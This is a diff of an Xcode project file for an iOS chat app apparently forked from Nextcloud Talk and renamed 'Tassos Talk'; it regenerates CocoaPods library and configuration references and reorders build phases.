@@ -8,6 +8,7 @@
 
 /* Begin PBXBuildFile section */
 		0ACF92E32FB2E63600A83D5C /* splash_logo.png in Resources */ = {isa = PBXBuildFile; fileRef = 0ACF92E22FB2E63600A83D5C /* splash_logo.png */; };
+		1814E8B16D55BD4726EE20A6 /* libPods-Tassos Talk.a in Frameworks */ = {isa = PBXBuildFile; fileRef = E36A1C3688BF336D53EF7A7A /* libPods-Tassos Talk.a */; };
 		1F0ECBF52A68274400921E90 /* CDMarkdownKit in Frameworks */ = {isa = PBXBuildFile; productRef = 1F0ECBF42A68274400921E90 /* CDMarkdownKit */; };
 		1F0ECBF72A68277000921E90 /* CDMarkdownKit in Frameworks */ = {isa = PBXBuildFile; productRef = 1F0ECBF62A68277000921E90 /* CDMarkdownKit */; };
 		1F0ECBF92A68277C00921E90 /* CDMarkdownKit in Frameworks */ = {isa = PBXBuildFile; productRef = 1F0ECBF82A68277C00921E90 /* CDMarkdownKit */; };
@@ -107,7 +108,6 @@
 		1FF1361C2BFBC86A006A6101 /* SwiftyAttributes in Frameworks */ = {isa = PBXBuildFile; productRef = 1FF1361B2BFBC86A006A6101 /* SwiftyAttributes */; };
 		1FF2FD5D2AB99CCB000C9905 /* ReplayKit.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1FF2FD5C2AB99CCB000C9905 /* ReplayKit.framework */; };
 		1FF2FD722AB99CCB000C9905 /* BroadcastUploadExtension.appex in Embed App Extensions */ = {isa = PBXBuildFile; fileRef = 1FF2FD5B2AB99CCB000C9905 /* BroadcastUploadExtension.appex */; settings = {ATTRIBUTES = (RemoveHeadersOnCopy, ); }; };
-		2B4BED05DC4A4EB4761A6C87 /* libPods-TalkIntents.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 237121A4908D37D7D5CC71A4 /* libPods-TalkIntents.a */; };
 		2C0574821EDD9E8E00D9E7F2 /* main.m in Sources */ = {isa = PBXBuildFile; fileRef = 2C0574811EDD9E8E00D9E7F2 /* main.m */; };
 		2C0574851EDD9E8E00D9E7F2 /* AppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 2C0574841EDD9E8E00D9E7F2 /* AppDelegate.m */; };
 		2C05748E1EDD9E8E00D9E7F2 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 2C05748C1EDD9E8E00D9E7F2 /* Main.storyboard */; };
@@ -151,12 +151,12 @@
 		2CC1C38629C0945700C8436B /* DRCellSlideGestureRecognizer.m in Sources */ = {isa = PBXBuildFile; fileRef = 2CC1C38029C0945600C8436B /* DRCellSlideGestureRecognizer.m */; };
 		2CC1C38729C0945700C8436B /* DRCellSlideAction.m in Sources */ = {isa = PBXBuildFile; fileRef = 2CC1C38429C0945700C8436B /* DRCellSlideAction.m */; };
 		2CC1C38829C0945700C8436B /* DRCellSlideActionView.m in Sources */ = {isa = PBXBuildFile; fileRef = 2CC1C38529C0945700C8436B /* DRCellSlideActionView.m */; };
-		3FCA62550CD1442D28E8A7C6 /* libPods-NotificationServiceExtension.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 9B81BB7A4920C391CC2CACFD /* libPods-NotificationServiceExtension.a */; };
-		4890175925A0D7FC2EC76CC0 /* libPods-NextcloudTalkTests.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 7005E22D6C2896927FC3AEEC /* libPods-NextcloudTalkTests.a */; };
+		300F643BAD45C7C3CB63116C /* libPods-BroadcastUploadExtension.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 11F37657CAC1456E02F128A4 /* libPods-BroadcastUploadExtension.a */; };
+		5DA5D39EC7A83105595B37CD /* libPods-NextcloudTalkTests.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 84CA5083816C2EFF42C7DDE6 /* libPods-NextcloudTalkTests.a */; };
+		64D7D6116917B5FCFF1B063C /* libPods-ShareExtension.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 520F7F6EB2CBEB7897046817 /* libPods-ShareExtension.a */; };
+		73EA09B554781EE776F75160 /* libPods-TalkIntents.a in Frameworks */ = {isa = PBXBuildFile; fileRef = E45C7619EFD6AB70482863C0 /* libPods-TalkIntents.a */; };
 		80CDF8C42A8E098900CB57AE /* SwiftUIIntrospect in Frameworks */ = {isa = PBXBuildFile; productRef = 80CDF8C32A8E098900CB57AE /* SwiftUIIntrospect */; };
-		847EFC7236336B67A1A89358 /* libPods-BroadcastUploadExtension.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 9A3D305FCD7BF7E727A62F35 /* libPods-BroadcastUploadExtension.a */; };
-		8789AE73BFCAA413B43319C0 /* libPods-ShareExtension.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 684807120F4439797973DF73 /* libPods-ShareExtension.a */; };
-		9993261EDAC77481FF4EF58A /* libPods-NextcloudTalk.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 4F7C31E9D74F550EAF89931B /* libPods-NextcloudTalk.a */; };
+		D30904F44324AA2807085A7A /* libPods-NotificationServiceExtension.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 75B71947945C98D4616B674D /* libPods-NotificationServiceExtension.a */; };
 /* End PBXBuildFile section */
 
 /* Begin PBXContainerItemProxy section */
@@ -282,7 +282,12 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
+		0258240EC1628EB96871BAEF /* Pods-BroadcastUploadExtension.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BroadcastUploadExtension.debug.xcconfig"; path = "Target Support Files/Pods-BroadcastUploadExtension/Pods-BroadcastUploadExtension.debug.xcconfig"; sourceTree = "<group>"; };
 		0ACF92E22FB2E63600A83D5C /* splash_logo.png */ = {isa = PBXFileReference; lastKnownFileType = image.png; path = splash_logo.png; sourceTree = "<group>"; };
+		0DF4645C9F26DA7B73E5C647 /* Pods-Tassos Talk.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Tassos Talk.debug.xcconfig"; path = "Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk.debug.xcconfig"; sourceTree = "<group>"; };
+		11F37657CAC1456E02F128A4 /* libPods-BroadcastUploadExtension.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-BroadcastUploadExtension.a"; sourceTree = BUILT_PRODUCTS_DIR; };
+		163288D7926F386BD8C90CA1 /* Pods-TalkIntents.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-TalkIntents.release.xcconfig"; path = "Target Support Files/Pods-TalkIntents/Pods-TalkIntents.release.xcconfig"; sourceTree = "<group>"; };
+		19AD4B3E37C340651C4737A1 /* Pods-NotificationServiceExtension.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NotificationServiceExtension.release.xcconfig"; path = "Target Support Files/Pods-NotificationServiceExtension/Pods-NotificationServiceExtension.release.xcconfig"; sourceTree = "<group>"; };
 		1F21A0622C77863500ED8C0C /* nb-NO */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = "nb-NO"; path = "nb-NO.lproj/InfoPlist.strings"; sourceTree = "<group>"; };
 		1F21A0632C77863500ED8C0C /* nb-NO */ = {isa = PBXFileReference; lastKnownFileType = text.plist.strings; name = "nb-NO"; path = "nb-NO.lproj/Localizable.strings"; sourceTree = "<group>"; };
 		1F21A0642C77863500ED8C0C /* nb-NO */ = {isa = PBXFileReference; lastKnownFileType = text.plist.stringsdict; name = "nb-NO"; path = "nb-NO.lproj/Localizable.stringsdict"; sourceTree = "<group>"; };
@@ -320,7 +325,6 @@
 		1FE052B82F1C463E00B975FD /* NCTypes.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = NCTypes.h; sourceTree = "<group>"; };
 		1FF2FD5B2AB99CCB000C9905 /* BroadcastUploadExtension.appex */ = {isa = PBXFileReference; explicitFileType = "wrapper.app-extension"; includeInIndex = 0; path = BroadcastUploadExtension.appex; sourceTree = BUILT_PRODUCTS_DIR; };
 		1FF2FD5C2AB99CCB000C9905 /* ReplayKit.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = ReplayKit.framework; path = System/Library/Frameworks/ReplayKit.framework; sourceTree = SDKROOT; };
-		237121A4908D37D7D5CC71A4 /* libPods-TalkIntents.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-TalkIntents.a"; sourceTree = BUILT_PRODUCTS_DIR; };
 		2C05747D1EDD9E8E00D9E7F2 /* Tassos Talk.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Tassos Talk.app"; sourceTree = BUILT_PRODUCTS_DIR; };
 		2C0574811EDD9E8E00D9E7F2 /* main.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; };
 		2C0574831EDD9E8E00D9E7F2 /* AppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AppDelegate.h; sourceTree = "<group>"; };
@@ -444,23 +448,19 @@
 		2CE726D92E982A6200BA2C0F /* uk */ = {isa = PBXFileReference; lastKnownFileType = text.plist.stringsdict; name = uk; path = uk.lproj/Localizable.stringsdict; sourceTree = "<group>"; };
 		2CEA990828B8B5780029216A /* de */ = {isa = PBXFileReference; lastKnownFileType = text.plist.stringsdict; name = de; path = de.lproj/Localizable.stringsdict; sourceTree = "<group>"; };
 		2CEDA87E26EF91460044552B /* NextcloudTalk-Bridging-Header.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = "NextcloudTalk-Bridging-Header.h"; sourceTree = "<group>"; };
-		342600BABD1AD1FCA48B5E59 /* Pods-NextcloudTalkTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NextcloudTalkTests.debug.xcconfig"; path = "Pods/Target Support Files/Pods-NextcloudTalkTests/Pods-NextcloudTalkTests.debug.xcconfig"; sourceTree = "<group>"; };
-		4202C63030F0FFBB1C16D75E /* Pods-NextcloudTalk.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NextcloudTalk.debug.xcconfig"; path = "Pods/Target Support Files/Pods-NextcloudTalk/Pods-NextcloudTalk.debug.xcconfig"; sourceTree = "<group>"; };
-		4D4C7BF2F97F47B0D9094618 /* Pods-NextcloudTalk.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NextcloudTalk.release.xcconfig"; path = "Pods/Target Support Files/Pods-NextcloudTalk/Pods-NextcloudTalk.release.xcconfig"; sourceTree = "<group>"; };
-		4F7C31E9D74F550EAF89931B /* libPods-NextcloudTalk.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-NextcloudTalk.a"; sourceTree = BUILT_PRODUCTS_DIR; };
-		584BF273DF09DE4D5EE0DA0F /* Pods-ShareExtension.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ShareExtension.debug.xcconfig"; path = "Pods/Target Support Files/Pods-ShareExtension/Pods-ShareExtension.debug.xcconfig"; sourceTree = "<group>"; };
-		684807120F4439797973DF73 /* libPods-ShareExtension.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-ShareExtension.a"; sourceTree = BUILT_PRODUCTS_DIR; };
-		6E8E34E233E9B296CE1C3B0B /* Pods-TalkIntents.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-TalkIntents.release.xcconfig"; path = "Pods/Target Support Files/Pods-TalkIntents/Pods-TalkIntents.release.xcconfig"; sourceTree = "<group>"; };
-		7005E22D6C2896927FC3AEEC /* libPods-NextcloudTalkTests.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-NextcloudTalkTests.a"; sourceTree = BUILT_PRODUCTS_DIR; };
-		82CD0527E04B844CAD762ADE /* Pods-BroadcastUploadExtension.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BroadcastUploadExtension.debug.xcconfig"; path = "Pods/Target Support Files/Pods-BroadcastUploadExtension/Pods-BroadcastUploadExtension.debug.xcconfig"; sourceTree = "<group>"; };
-		86A9CB1D6A94A44E9B016584 /* Pods-TalkIntents.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-TalkIntents.debug.xcconfig"; path = "Pods/Target Support Files/Pods-TalkIntents/Pods-TalkIntents.debug.xcconfig"; sourceTree = "<group>"; };
-		95D756208A81284B975853EC /* Pods-ShareExtension.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ShareExtension.release.xcconfig"; path = "Pods/Target Support Files/Pods-ShareExtension/Pods-ShareExtension.release.xcconfig"; sourceTree = "<group>"; };
-		9A3D305FCD7BF7E727A62F35 /* libPods-BroadcastUploadExtension.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-BroadcastUploadExtension.a"; sourceTree = BUILT_PRODUCTS_DIR; };
-		9B81BB7A4920C391CC2CACFD /* libPods-NotificationServiceExtension.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-NotificationServiceExtension.a"; sourceTree = BUILT_PRODUCTS_DIR; };
-		A8F95DE6635ABC1E64CA8E4A /* Pods-BroadcastUploadExtension.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BroadcastUploadExtension.release.xcconfig"; path = "Pods/Target Support Files/Pods-BroadcastUploadExtension/Pods-BroadcastUploadExtension.release.xcconfig"; sourceTree = "<group>"; };
-		B7874918820589BF8FD69BED /* Pods-NextcloudTalkTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NextcloudTalkTests.release.xcconfig"; path = "Pods/Target Support Files/Pods-NextcloudTalkTests/Pods-NextcloudTalkTests.release.xcconfig"; sourceTree = "<group>"; };
-		D6DF51D976DC0F681FF83F7B /* Pods-NotificationServiceExtension.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NotificationServiceExtension.debug.xcconfig"; path = "Pods/Target Support Files/Pods-NotificationServiceExtension/Pods-NotificationServiceExtension.debug.xcconfig"; sourceTree = "<group>"; };
-		D86091EC1125C3057B9A299B /* Pods-NotificationServiceExtension.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NotificationServiceExtension.release.xcconfig"; path = "Pods/Target Support Files/Pods-NotificationServiceExtension/Pods-NotificationServiceExtension.release.xcconfig"; sourceTree = "<group>"; };
+		30EF75FD1C7ADEBD3A5D78D4 /* Pods-NextcloudTalkTests.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NextcloudTalkTests.release.xcconfig"; path = "Target Support Files/Pods-NextcloudTalkTests/Pods-NextcloudTalkTests.release.xcconfig"; sourceTree = "<group>"; };
+		41F18CD98EBA46532E32023E /* Pods-NotificationServiceExtension.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NotificationServiceExtension.debug.xcconfig"; path = "Target Support Files/Pods-NotificationServiceExtension/Pods-NotificationServiceExtension.debug.xcconfig"; sourceTree = "<group>"; };
+		51E968331C74FC92A06705B4 /* Pods-NextcloudTalkTests.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-NextcloudTalkTests.debug.xcconfig"; path = "Target Support Files/Pods-NextcloudTalkTests/Pods-NextcloudTalkTests.debug.xcconfig"; sourceTree = "<group>"; };
+		520F7F6EB2CBEB7897046817 /* libPods-ShareExtension.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-ShareExtension.a"; sourceTree = BUILT_PRODUCTS_DIR; };
+		75B71947945C98D4616B674D /* libPods-NotificationServiceExtension.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-NotificationServiceExtension.a"; sourceTree = BUILT_PRODUCTS_DIR; };
+		84CA5083816C2EFF42C7DDE6 /* libPods-NextcloudTalkTests.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-NextcloudTalkTests.a"; sourceTree = BUILT_PRODUCTS_DIR; };
+		936E58A239A75F6C1BECB359 /* Pods-BroadcastUploadExtension.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-BroadcastUploadExtension.release.xcconfig"; path = "Target Support Files/Pods-BroadcastUploadExtension/Pods-BroadcastUploadExtension.release.xcconfig"; sourceTree = "<group>"; };
+		95F3937A0BB375ECE68225A9 /* Pods-Tassos Talk.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Tassos Talk.release.xcconfig"; path = "Target Support Files/Pods-Tassos Talk/Pods-Tassos Talk.release.xcconfig"; sourceTree = "<group>"; };
+		B113E0AADDDE0C7AC469DBD3 /* Pods-ShareExtension.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ShareExtension.release.xcconfig"; path = "Target Support Files/Pods-ShareExtension/Pods-ShareExtension.release.xcconfig"; sourceTree = "<group>"; };
+		B2397D8D330AD1F18D8F7E3C /* Pods-TalkIntents.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-TalkIntents.debug.xcconfig"; path = "Target Support Files/Pods-TalkIntents/Pods-TalkIntents.debug.xcconfig"; sourceTree = "<group>"; };
+		BF1B099F9CA45187181D47CE /* Pods-ShareExtension.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-ShareExtension.debug.xcconfig"; path = "Target Support Files/Pods-ShareExtension/Pods-ShareExtension.debug.xcconfig"; sourceTree = "<group>"; };
+		E36A1C3688BF336D53EF7A7A /* libPods-Tassos Talk.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-Tassos Talk.a"; sourceTree = BUILT_PRODUCTS_DIR; };
+		E45C7619EFD6AB70482863C0 /* libPods-TalkIntents.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-TalkIntents.a"; sourceTree = BUILT_PRODUCTS_DIR; };
 /* End PBXFileReference section */
 
 /* Begin PBXFileSystemSynchronizedBuildFileExceptionSet section */
@@ -1201,7 +1201,7 @@
 				1F759C182B63B9D9000534AB /* SwiftyAttributes in Frameworks */,
 				1F759C1C2B63B9D9000534AB /* TOCropViewController in Frameworks */,
 				1F759C1E2B63B9D9000534AB /* SwiftUIIntrospect in Frameworks */,
-				4890175925A0D7FC2EC76CC0 /* libPods-NextcloudTalkTests.a in Frameworks */,
+				5DA5D39EC7A83105595B37CD /* libPods-NextcloudTalkTests.a in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1218,7 +1218,7 @@
 				1FA93DED2D71012000DF6CDF /* SDWebImageSVGKitPlugin in Frameworks */,
 				1FA93DEF2D71012500DF6CDF /* SwiftyAttributes in Frameworks */,
 				1F96D76E2D93013C0088331F /* SwiftyXMLParser in Frameworks */,
-				2B4BED05DC4A4EB4761A6C87 /* libPods-TalkIntents.a in Frameworks */,
+				73EA09B554781EE776F75160 /* libPods-TalkIntents.a in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1241,9 +1241,9 @@
 				1F77A5EF2AB9A41E007B6037 /* SDWebImage in Frameworks */,
 				1F899F272EF9E60F00890727 /* SwiftyRSA in Frameworks */,
 				1FF1361A2BFBC841006A6101 /* SwiftyAttributes in Frameworks */,
-				847EFC7236336B67A1A89358 /* libPods-BroadcastUploadExtension.a in Frameworks */,
 				1F77A5F12AB9A423007B6037 /* SDWebImageSVGKitPlugin in Frameworks */,
 				2C349B862D71A15F004EC882 /* SwiftyXMLParser in Frameworks */,
+				300F643BAD45C7C3CB63116C /* libPods-BroadcastUploadExtension.a in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1278,7 +1278,7 @@
 				1F66B72F29FABD01003FB168 /* SwiftyAttributes in Frameworks */,
 				1F7AE07829142CA1009F72AD /* NextcloudKit in Frameworks */,
 				2C349B842D71A058004EC882 /* SwiftyXMLParser in Frameworks */,
-				9993261EDAC77481FF4EF58A /* libPods-NextcloudTalk.a in Frameworks */,
+				1814E8B16D55BD4726EE20A6 /* libPods-Tassos Talk.a in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1290,7 +1290,6 @@
 				2C349B822D71A03B004EC882 /* SwiftyXMLParser in Frameworks */,
 				1FAB2E7F2AC99367001214EB /* TOCropViewController in Frameworks */,
 				1F0ECBF92A68277C00921E90 /* CDMarkdownKit in Frameworks */,
-				8789AE73BFCAA413B43319C0 /* libPods-ShareExtension.a in Frameworks */,
 				1F759C302B63CBA0000534AB /* Realm in Frameworks */,
 				1FC4B3292CC0562E00D28138 /* UICKeyChainStore in Frameworks */,
 				1FC4B3312CC057B700D28138 /* MBProgressHUD in Frameworks */,
@@ -1300,6 +1299,7 @@
 				1F45A1252A01D8F7005FE87D /* SDWebImageSVGKitPlugin in Frameworks */,
 				1F35F8F52AEEDA9800044BDA /* SwiftyAttributes in Frameworks */,
 				1F899F252EF9E60900890727 /* SwiftyRSA in Frameworks */,
+				64D7D6116917B5FCFF1B063C /* libPods-ShareExtension.a in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1315,9 +1315,9 @@
 				1F7AE07D29158878009F72AD /* IntentsUI.framework in Frameworks */,
 				1F899F232EF9E60500890727 /* SwiftyRSA in Frameworks */,
 				1FF1361C2BFBC86A006A6101 /* SwiftyAttributes in Frameworks */,
-				3FCA62550CD1442D28E8A7C6 /* libPods-NotificationServiceExtension.a in Frameworks */,
 				1F45A11E2A01D719005FE87D /* SDWebImage in Frameworks */,
 				2C349B802D71A030004EC882 /* SwiftyXMLParser in Frameworks */,
+				D30904F44324AA2807085A7A /* libPods-NotificationServiceExtension.a in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -1337,7 +1337,7 @@
 				2C05747F1EDD9E8E00D9E7F2 /* NextcloudTalk */,
 				2C90E5621EDDE0FB0093D85A /* Frameworks */,
 				1F9629882E8E6E2900EC9BEE /* Sounds */,
-				926177EBCFB97EA1273DEDB9 /* Pods */,
+				B84319D08C19A3CA2BBB9A36 /* Pods */,
 			);
 			sourceTree = "<group>";
 		};
@@ -1443,14 +1443,14 @@
 				2C90E5681EDDE13A0093D85A /* UIKit.framework */,
 				2C90E5661EDDE1340093D85A /* CoreGraphics.framework */,
 				2C90E5631EDDE0FB0093D85A /* Foundation.framework */,
-				9B81BB7A4920C391CC2CACFD /* libPods-NotificationServiceExtension.a */,
-				684807120F4439797973DF73 /* libPods-ShareExtension.a */,
-				4F7C31E9D74F550EAF89931B /* libPods-NextcloudTalk.a */,
 				1FF2FD5C2AB99CCB000C9905 /* ReplayKit.framework */,
-				9A3D305FCD7BF7E727A62F35 /* libPods-BroadcastUploadExtension.a */,
-				7005E22D6C2896927FC3AEEC /* libPods-NextcloudTalkTests.a */,
 				1FA93D8B2D70FB3400DF6CDF /* Intents.framework */,
-				237121A4908D37D7D5CC71A4 /* libPods-TalkIntents.a */,
+				11F37657CAC1456E02F128A4 /* libPods-BroadcastUploadExtension.a */,
+				84CA5083816C2EFF42C7DDE6 /* libPods-NextcloudTalkTests.a */,
+				75B71947945C98D4616B674D /* libPods-NotificationServiceExtension.a */,
+				520F7F6EB2CBEB7897046817 /* libPods-ShareExtension.a */,
+				E45C7619EFD6AB70482863C0 /* libPods-TalkIntents.a */,
+				E36A1C3688BF336D53EF7A7A /* libPods-Tassos Talk.a */,
 			);
 			name = Frameworks;
 			sourceTree = "<group>";
@@ -1509,23 +1509,23 @@
 			path = ThirdParty/DRCellSlideGestureRecognizer/DRCellSlideGestureRecognizer;
 			sourceTree = "<group>";
 		};
-		926177EBCFB97EA1273DEDB9 /* Pods */ = {
+		B84319D08C19A3CA2BBB9A36 /* Pods */ = {
 			isa = PBXGroup;
 			children = (
-				D6DF51D976DC0F681FF83F7B /* Pods-NotificationServiceExtension.debug.xcconfig */,
-				D86091EC1125C3057B9A299B /* Pods-NotificationServiceExtension.release.xcconfig */,
-				584BF273DF09DE4D5EE0DA0F /* Pods-ShareExtension.debug.xcconfig */,
-				95D756208A81284B975853EC /* Pods-ShareExtension.release.xcconfig */,
-				4202C63030F0FFBB1C16D75E /* Pods-NextcloudTalk.debug.xcconfig */,
-				4D4C7BF2F97F47B0D9094618 /* Pods-NextcloudTalk.release.xcconfig */,
-				82CD0527E04B844CAD762ADE /* Pods-BroadcastUploadExtension.debug.xcconfig */,
-				A8F95DE6635ABC1E64CA8E4A /* Pods-BroadcastUploadExtension.release.xcconfig */,
-				342600BABD1AD1FCA48B5E59 /* Pods-NextcloudTalkTests.debug.xcconfig */,
-				B7874918820589BF8FD69BED /* Pods-NextcloudTalkTests.release.xcconfig */,
-				86A9CB1D6A94A44E9B016584 /* Pods-TalkIntents.debug.xcconfig */,
-				6E8E34E233E9B296CE1C3B0B /* Pods-TalkIntents.release.xcconfig */,
+				0258240EC1628EB96871BAEF /* Pods-BroadcastUploadExtension.debug.xcconfig */,
+				936E58A239A75F6C1BECB359 /* Pods-BroadcastUploadExtension.release.xcconfig */,
+				51E968331C74FC92A06705B4 /* Pods-NextcloudTalkTests.debug.xcconfig */,
+				30EF75FD1C7ADEBD3A5D78D4 /* Pods-NextcloudTalkTests.release.xcconfig */,
+				41F18CD98EBA46532E32023E /* Pods-NotificationServiceExtension.debug.xcconfig */,
+				19AD4B3E37C340651C4737A1 /* Pods-NotificationServiceExtension.release.xcconfig */,
+				BF1B099F9CA45187181D47CE /* Pods-ShareExtension.debug.xcconfig */,
+				B113E0AADDDE0C7AC469DBD3 /* Pods-ShareExtension.release.xcconfig */,
+				B2397D8D330AD1F18D8F7E3C /* Pods-TalkIntents.debug.xcconfig */,
+				163288D7926F386BD8C90CA1 /* Pods-TalkIntents.release.xcconfig */,
+				0DF4645C9F26DA7B73E5C647 /* Pods-Tassos Talk.debug.xcconfig */,
+				95F3937A0BB375ECE68225A9 /* Pods-Tassos Talk.release.xcconfig */,
 			);
-			name = Pods;
+			path = Pods;
 			sourceTree = "<group>";
 		};
 /* End PBXGroup section */
@@ -1535,8 +1535,8 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 1F6D8C362B2E3756004376B8 /* Build configuration list for PBXNativeTarget "NextcloudTalkTests" */;
 			buildPhases = (
-				7E307959FCCC4FD79D42DAD8 /* Build Target Libraries */,
-				3A811BF7A761836E61C82B80 /* [CP] Check Pods Manifest.lock */,
+				7FE7122EBE1F41CCB342DAD8 /* Compile Code Assets */,
+				4C62A0DA2A535884EF5B92D9 /* [CP] Check Pods Manifest.lock */,
 				1F6D8C2C2B2E3756004376B8 /* Sources */,
 				1F6D8C2D2B2E3756004376B8 /* Frameworks */,
 				1F6D8C2E2B2E3756004376B8 /* Resources */,
@@ -1569,7 +1569,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 1FA93DA62D70FCC200DF6CDF /* Build configuration list for PBXNativeTarget "TalkIntents" */;
 			buildPhases = (
-				35AE83D109DE2E04F651A88D /* [CP] Check Pods Manifest.lock */,
+				72FB616D5760144DEC1FEE3D /* [CP] Check Pods Manifest.lock */,
 				1FA93D982D70FCC200DF6CDF /* Sources */,
 				1FA93D992D70FCC200DF6CDF /* Frameworks */,
 				1FA93D9A2D70FCC200DF6CDF /* Resources */,
@@ -1624,7 +1624,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 1FF2FD782AB99CCC000C9905 /* Build configuration list for PBXNativeTarget "BroadcastUploadExtension" */;
 			buildPhases = (
-				CBF95D503F715CE6BE80B113 /* [CP] Check Pods Manifest.lock */,
+				1DFAD69D1C42BA5CB3F711B8 /* [CP] Check Pods Manifest.lock */,
 				1FF2FD572AB99CCB000C9905 /* Sources */,
 				1FF2FD582AB99CCB000C9905 /* Frameworks */,
 				1FF2FD592AB99CCB000C9905 /* Resources */,
@@ -1661,17 +1661,17 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 2C0574971EDD9E8E00D9E7F2 /* Build configuration list for PBXNativeTarget "Tassos Talk" */;
 			buildPhases = (
-				902A7A3EC0BDCC947AEF3EBF /* [CP] Check Pods Manifest.lock */,
+				B6ED936C73A68D2CCA716337 /* [CP] Check Pods Manifest.lock */,
 				2C0574791EDD9E8E00D9E7F2 /* Sources */,
 				2C05747A1EDD9E8E00D9E7F2 /* Frameworks */,
 				2C05747B1EDD9E8E00D9E7F2 /* Resources */,
-				A3C686B1B84C4462F93441AB /* [CP] Copy Pods Resources */,
 				2C8035721F950BA800501B5C /* ShellScript */,
 				2C3F6AB01FBB1ACD00E2705C /* Embed App Extensions */,
 				1FA93DAA2D70FCC200DF6CDF /* Embed ExtensionKit Extensions */,
